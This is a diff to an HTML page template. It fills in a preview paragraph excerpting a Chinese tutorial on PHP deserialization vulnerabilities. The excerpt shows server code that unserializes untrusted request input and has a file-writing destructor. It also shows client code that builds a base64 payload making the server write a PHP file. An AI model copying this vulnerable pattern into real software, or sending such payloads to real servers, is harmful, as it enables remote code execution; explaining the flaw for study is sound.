@@ -380,7 +380,7 @@
 
     
     <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
-        这里是正文 0x00 关于反序列化漏洞 序列化：使用函数serialize()可将实例序列化为字符串 反序列化：使用函数unserialize()可将序列化的字符串还原 若服务端有如下代码： &lt;?php class foo{ public $file = &quot;test.txt&quot;; public $data = &quot;123456&quot;; function __destruct(){ file_put_contents($this-&gt;file,$this-&gt;data); } } $d = $_REQUEST['str']; var_dump($d); echo &quot;&lt;br /&gt;&quot;; $tc = unserialize(base64_decode($d)); var_dump($tc); ?&gt; 客户端可构造如下代码生成序列化后的字符串提交给服务端， 服务端就会生成文件xx.php，内容为&lt;?php phpinfo(); ?&gt;： &lt;?php class foo { public $ﬁle = &quot;test.txt&quot;; public $data = &quot;123456&quot;; function __destruct() { ﬁle_put_contents($this-&gt;ﬁle, $this-&gt;data); } } $f = new foo(); $f-&gt;ﬁle = &quot;xx.php&quot;; $f-&gt;data = &quot;&lt;?php phpinfo(); ?&gt;&quot;; echo
+        0x00 关于反序列化漏洞 序列化：使用函数serialize()可将实例序列化为字符串 反序列化：使用函数unserialize()可将序列化的字符串还原 若服务端有如下代码： &lt;?php class foo{ public $file = &quot;test.txt&quot;; public $data = &quot;123456&quot;; function __destruct(){ file_put_contents($this-&gt;file,$this-&gt;data); } } $d = $_REQUEST['str']; var_dump($d); echo &quot;&lt;br /&gt;&quot;; $tc = unserialize(base64_decode($d)); var_dump($tc); ?&gt; 客户端可构造如下代码生成序列化后的字符串提交给服务端， 服务端就会生成文件xx.php，内容为&lt;?php phpinfo(); ?&gt;： &lt;?php class foo { public $ﬁle = &quot;test.txt&quot;; public $data = &quot;123456&quot;; function __destruct() { ﬁle_put_contents($this-&gt;ﬁle, $this-&gt;data); } } $f = new foo(); $f-&gt;ﬁle = &quot;xx.php&quot;; $f-&gt;data = &quot;&lt;?php phpinfo(); ?&gt;&quot;; echo base64_encode(serialize($f));
     </p>
 
     
